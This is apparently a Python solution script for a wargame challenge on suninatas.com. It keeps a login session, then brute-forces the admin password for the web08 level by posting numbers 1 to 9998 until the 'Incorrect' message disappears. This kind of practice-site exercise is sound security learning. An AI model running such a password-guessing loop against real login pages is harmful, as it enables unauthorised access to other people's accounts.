import requests

login_url = 'http://suninatas.com/member/mem_action.asp'
with requests.Session() as s:
    main_login = {'Hid': '', 'Hpw': ''}

    main_login_req = s.post(login_url, data=main_login)

    if main_login_req.status_code != 200:
        raise Exception('connection error')
    
    #로그인 세션 유지
    
    level8 = 'http://suninatas.com/Part_one/web08/web08.asp'

    level8_login = {'id': 'admin', 'pw': 1}

    for i in range(1, 9999):
        print('current pw :', level8_login['pw'])

        login_req = s.post(level8, data=level8_login)
        html = login_req.text
        if 'Incorrect' in html:
            print('incorrect\n')
            level8_login['pw'] += 1
        else:
            print('success')
            break